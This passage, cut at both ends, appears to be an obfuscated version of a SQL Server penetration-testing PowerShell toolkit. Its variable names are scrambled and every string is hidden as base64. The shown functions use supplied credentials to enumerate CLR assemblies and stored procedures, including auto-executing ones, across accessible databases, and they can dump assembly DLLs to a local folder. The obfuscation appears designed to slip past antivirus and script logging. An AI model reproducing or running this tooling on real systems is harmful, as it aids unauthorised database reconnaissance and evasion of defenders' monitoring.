        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAGgAZQBtAGEAXwBuAGEAbQBlAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAGkAZAA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAG4AYQBtAGUA'))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBsAHIAXwBuAGEAbQBlAA=='))))   
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AaQBkAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AbgBhAG0AZQA=')))) 
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AYwBsAGEAcwBzAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AbQBlAHQAaABvAGQA'))))    
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AbwBiAGoAZQBjAHQAXwBpAGQA')))) 
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AbgBhAG0AZQA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AdAB5AHAAZQA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABlAHIAbQBpAHMAcwBpAG8AbgBfAHMAZQB0AF8AZABlAHMAYwA='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBkAGEAdABlAA=='))))
        $null = ${/==\_____/==\_/\/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AdABlAG4AdAA='))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        if($NoDefaults)
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            ${/=\_____/\__/=\/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        if($AssemblyName){
            ${/=\_/==\__/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBIAEUAUgBFACAAYQBmAC4AbgBhAG0AZQAgAEwASQBLAEUAIAAnACUAJABBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAlACcA')))
        }else{
            ${/=\_/==\__/====\_} = ""
        }
        ${_/=\_/\__/====\_/} = 0
        ${/=\_____/\__/=\/\} |
        % -Process {
            ${/====\/=\_/==\__/} = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAEMATABSACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzACAAaQBuACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9AA==')))
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAIAAgACAAIAAgAFMAQwBIAEUATQBBAF8ATgBBAE0ARQAoAHMAbwAuAFsAcwBjAGgAZQBtAGEAXwBpAGQAXQApACAAQQBTACAAWwBzAGMAaABlAG0AYQBfAG4AYQBtAGUAXQAsACAADQAKAAkACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAZgAuAGYAaQBsAGUAXwBpAGQALAAJAAkACQAJAAkAIAAgAAkADQAKAAkACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAZgAuAG4AYQBtAGUAIAArACAAJwAuAGQAbABsACcAIABhAHMAIABbAGYAaQBsAGUAXwBuAGEAbQBlAF0ALAANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBzAG0AYgBsAHkALgBjAGwAcgBfAG4AYQBtAGUALAANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBzAG0AYgBsAHkALgBhAHMAcwBlAG0AYgBsAHkAXwBpAGQALAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKAAkACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAcwBtAGIAbAB5AC4AbgBhAG0AZQAgAEEAUwAgAFsAYQBzAHMAZQBtAGIAbAB5AF8AbgBhAG0AZQBdACwAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBtAC4AYQBzAHMAZQBtAGIAbAB5AF8AYwBsAGEAcwBzACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAbQAuAGEAcwBzAGUAbQBiAGwAeQBfAG0AZQB0AGgAbwBkACwADQAKAAkACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAbwAuAG8AYgBqAGUAYwB0AF8AaQBkACAAYQBzACAAWwBzAHAAXwBvAGIAagBlAGMAdABfAGkAZABdACwADQAKAAkACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAbwAuAG4AYQBtAGUAIABBAFMAIABbAHMAcABfAG4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAG8ALgBbAHQAeQBwAGUAXQAgAGEAcwAgAFsAcwBwAF8AdAB5AHAAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAcwBtAGIAbAB5AC4AcABlAHIAbQBpAHMAcwBpAG8AbgBfAHMAZQB0AF8AZABlAHMAYwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAGMAcgBlAGEAdABlAF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAG0AbwBkAGkAZgB5AF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAGYALgBjAG8AbgB0AGUAbgB0AAkACQAJAAkACQAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEYAUgBPAE0AIAAgACAAIAAgACAAIAAgAHMAeQBzAC4AYQBzAHMAZQBtAGIAbAB5AF8AbQBvAGQAdQBsAGUAcwAgAGEAbQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBOAE4ARQBSACAASgBPAEkATgAgACAAcwB5AHMALgBhAHMAcwBlAG0AYgBsAGkAZQBzACAAYQBzAG0AYgBsAHkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgACAAYQBzAG0AYgBsAHkALgBhAHMAcwBlAG0AYgBsAHkAXwBpAGQAIAA9ACAAYQBtAC4AYQBzAHMAZQBtAGIAbAB5AF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAE4ATgBFAFIAIABKAE8ASQBOACAAcwB5AHMALgBhAHMAcwBlAG0AYgBsAHkAXwBmAGkAbABlAHMAIABhAGYAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBOACAAYQBzAG0AYgBsAHkALgBhAHMAcwBlAG0AYgBsAHkAXwBpAGQAIAA9ACAAYQBmAC4AYQBzAHMAZQBtAGIAbAB5AF8AaQBkACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIAAgAHMAeQBzAC4AbwBiAGoAZQBjAHQAcwAgAHMAbwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBOACAAIABzAG8ALgBbAG8AYgBqAGUAYwB0AF8AaQBkAF0AIAA9ACAAYQBtAC4AWwBvAGIAagBlAGMAdABfAGkAZABdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsALwA9AFwAXwAvAD0APQBcAF8AXwAvAD0APQA9AD0AXABfAH0A')))
                    ${_/====\_/\/\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFUATgBJAE8ATgAgAEEATABMAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAEUATABFAEMAVAAgACAAIAAgACAAIABTAEMASABFAE0AQQBfAE4AQQBNAEUAKABhAHQALgBbAHMAYwBoAGUAbQBhAF8AaQBkAF0AKQAgAEEAUwAgAFsAUwBjAGgAZQBtAGEATgBhAG0AZQBdACwAIAANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBmAC4AZgBpAGwAZQBfAGkAZAAsAAkACQAJAAkACQAgACAACQANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBmAC4AbgBhAG0AZQAgACsAIAAnAC4AZABsAGwAJwAgAGEAcwAgAFsAZgBpAGwAZQBfAG4AYQBtAGUAXQAsAA0ACgAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAGMAbAByAF8AbgBhAG0AZQAsAA0ACgAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAGEAcwBzAGUAbQBiAGwAeQBfAGkAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAG4AYQBtAGUAIABBAFMAIABbAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQB0AC4AYQBzAHMAZQBtAGIAbAB5AF8AYwBsAGEAcwBzACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AVQBMAEwAIABBAFMAIABbAGEAcwBzAGUAbQBiAGwAeQBfAG0AZQB0AGgAbwBkAF0ALAANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgBVAEwATAAgAGEAcwAgAFsAcwBwAF8AbwBiAGoAZQBjAHQAXwBpAGQAXQAsAA0ACgAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHQALgBuAGEAbQBlACAAQQBTACAAWwBzAHAAXwBuAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBVAEQAVAAnACAAQQBTACAAWwB0AHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBzAG0AYgBsAHkALgBwAGUAcgBtAGkAcwBzAGkAbwBuAF8AcwBlAHQAXwBkAGUAcwBjACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAcwBtAGIAbAB5AC4AYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAcwBtAGIAbAB5AC4AbQBvAGQAaQBmAHkAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAZgAuAGMAbwBuAHQAZQBuAHQACQAJAAkACQAJAAkACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgACAAIAAgACAAIAAgACAAcwB5AHMALgBhAHMAcwBlAG0AYgBsAHkAXwB0AHkAcABlAHMAIABhAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIAAgAHMAeQBzAC4AYQBzAHMAZQBtAGIAbABpAGUAcwAgAGEAcwBtAGIAbAB5ACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAGEAcwBtAGIAbAB5AC4AYQBzAHMAZQBtAGIAbAB5AF8AaQBkACAAPQAgAGEAdAAuAGEAcwBzAGUAbQBiAGwAeQBfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBOAE4ARQBSACAASgBPAEkATgAgAHMAeQBzAC4AYQBzAHMAZQBtAGIAbAB5AF8AZgBpAGwAZQBzACAAYQBmACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAGEAcwBtAGIAbAB5AC4AYQBzAHMAZQBtAGIAbAB5AF8AaQBkACAAPQAgAGEAZgAuAGEAcwBzAGUAbQBiAGwAeQBfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBSAEQARQBSACAAQgBZACAAIAAgACAAWwBhAHMAcwBlAG0AYgBsAHkAXwBuAGEAbQBlAF0ALAAgAFsAYQBzAHMAZQBtAGIAbAB5AF8AbQBlAHQAaABvAGQAXQAsACAAWwBzAHAAXwBuAGEAbQBlAF0A')))
            if($ShowAll){
                $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABRAHUAZQByAHkAJAB7AF8ALwA9AD0APQA9AFwAXwAvAFwALwBcAC8APQA9AFwALwB9AA==')))
            }
            ${/=\_/=\_/\_/\____} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/=\_/=\_/\_/\____} |
            % -Process {
                $null = ${/==\_____/==\_/\/}.Rows.Add(
                    [string]$ComputerName,
                    [string]$Instance,
                    [string]${/====\/=\_/==\__/},
                    [string]$_.schema_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.assembly_class,
                    [string]$_.assembly_method,
                    [string]$_.sp_object_id,
                    [string]$_.sp_name,
                    [string]$_.sp_type,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.content)
                ${_/=\___/===\/==\_} = $_.file_name
                ${__/===\__/\/\/\_/} = $_.assembly_method
                ${_/\_/==\/==\_/\/=} = $_.assembly_name
                ${/==\/\/\_/==\_/==} = $_.assembly_class
                ${____/==\__/\___/\} = $_.sp_name   
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEYAaQBsAGUAOgAkAHsAXwAvAD0AXABfAF8AXwAvAD0APQA9AFwALwA9AD0AXABfAH0AIABBAHMAcwBlAG0AYgBsAHkAOgAkAHsAXwAvAFwAXwAvAD0APQBcAC8APQA9AFwAXwAvAFwALwA9AH0AIABDAGwAYQBzAHMAOgAkAHsALwA9AD0AXAAvAFwALwBcAF8ALwA9AD0AXABfAC8APQA9AH0AIABNAGUAdABoAG8AZAA6ACQAewBfAF8ALwA9AD0APQBcAF8AXwAvAFwALwBcAC8AXABfAC8AfQAgAFAAcgBvAGMAOgAkAHsAXwBfAF8AXwAvAD0APQBcAF8AXwAvAFwAXwBfAF8ALwBcAH0A')))                             
                if($ExportFolder){
                    ${__/=\__/\___/====} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAHgAcABvAHIAdABGAG8AbABkAGUAcgBcAEMATABSAEUAeABwAG8AcgB0AHMA')))
                    If ((test-path ${__/=\__/\___/====}) -eq $False){
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAIAAgAEMAcgBlAGEAdABpAG4AZwAgAGUAeABwAG8AcgB0ACAAZgBvAGwAZABlAHIAOgAgACQAewBfAF8ALwA9AFwAXwBfAC8AXABfAF8AXwAvAD0APQA9AD0AfQA=')))
                        $null = ni -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0AXABfAF8ALwBcAF8AXwBfAC8APQA9AD0APQB9AA=='))) -type directory
                    }  
                    ${___/\_____/\/==\_} = $Instance -replace('\\','_')
                    ${__/\__/=\/\__/=\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0AXABfAF8ALwBcAF8AXwBfAC8APQA9AD0APQB9AFwAJAB7AF8AXwBfAC8AXABfAF8AXwBfAF8ALwBcAC8APQA9AFwAXwB9AA==')))
                    If ((test-path ${__/\__/=\/\__/=\/}) -eq $False){
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAIAAgAEMAcgBlAGEAdABpAG4AZwAgAHMAZQByAHYAZQByACAAZgBvAGwAZABlAHIAOgAgACQAewBfAF8ALwBcAF8AXwAvAD0AXAAvAFwAXwBfAC8APQBcAC8AfQA=')))
                        $null = ni -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwAXwBfAC8APQBcAC8AXABfAF8ALwA9AFwALwB9AA=='))) -type directory
                    }                   
                    ${_/=\___/=\__/==\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwAXwBfAC8APQBcAC8AXABfAF8ALwA9AFwALwB9AFwAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9AA==')))
                    If ((test-path ${_/=\___/=\__/==\/}) -eq $False){
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAIAAgAEMAcgBlAGEAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAGYAbwBsAGQAZQByADoAIAAkAHsAXwAvAD0AXABfAF8AXwAvAD0AXABfAF8ALwA9AD0AXAAvAH0A')))
                        $null = ni ${_/=\___/=\__/==\/} -type directory
                    } 
                    ${/==\____/========} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwBfAF8ALwA9AFwAXwBfAC8APQA9AFwALwB9AFwAJAB7AF8ALwA9AFwAXwBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwB9AA==')))
                    if(-not (Test-Path ${/==\____/========})){
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAIAAgAEUAeABwAG8AcgB0AGkAbgBnACAAJAB7AF8ALwA9AFwAXwBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwB9AA==')))                        
                        $_.content | sc -Encoding Byte ${/==\____/========}
                    }else{
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAIAAgAEUAeABwAG8AcgB0AGkAbgBnACAAJAB7AF8ALwA9AFwAXwBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwB9ACAALQAgAEEAYgBvAHIAdABlAGQALAAgAGYAaQBsAGUAIABlAHgAaQBzAHQAcwAuAA==')))  
                    }
                    ${_/=\_/\__/====\_/} = ${_/=\_/\__/====\_/} + 1                    
                }                     
            }
        }
    }
    End
    {
        ${___/==\/\_____/\_} = ${/==\_____/==\_/\/}.Rows.Count
        if (${___/==\/\_____/\_} -gt 0){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEYAbwB1AG4AZAAgACQAewBfAF8AXwAvAD0APQBcAC8AXABfAF8AXwBfAF8ALwBcAF8AfQAgAEMATABSACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzAA==')))
        }else{
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAEMATABSACAAcwB0AG8AcgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzACAAZgBvAHUAbgBkAC4A')))    
        }
        ${/==\_____/==\_/\/}
    }
}
Function  Get-SQLStoredProcedure
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\/\__/===\/\/\_} = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            ${/=\____/=\/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFIATwBVAFQASQBOAEUAXwBOAEEATQBFACAAbABpAGsAZQAgACcAJABQAHIAbwBjAGUAZAB1AHIAZQBOAGEAbQBlACcA')))
        }
        else
        {
            ${/=\____/=\/====\_} = ''
        }
        if ($Keyword)
        {
            ${/==\/===\__/\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAFIATwBVAFQASQBOAEUAXwBEAEUARgBJAE4ASQBUAEkATwBOACAAbABpAGsAZQAgACcAJQAkAEsAZQB5AHcAbwByAGQAJQAnAA==')))
        }
        else
        {
            ${/==\/===\__/\/\/\} = ''
        }
        if ($AutoExec)
        {
            ${_/=\_____/\/=\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAGkAcwBfAGEAdQB0AG8AXwBlAHgAZQBjAHUAdABlAGQAIAA9ACAAMQA=')))
        }
        else
        {
            ${_/=\_____/\/=\_/=} = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
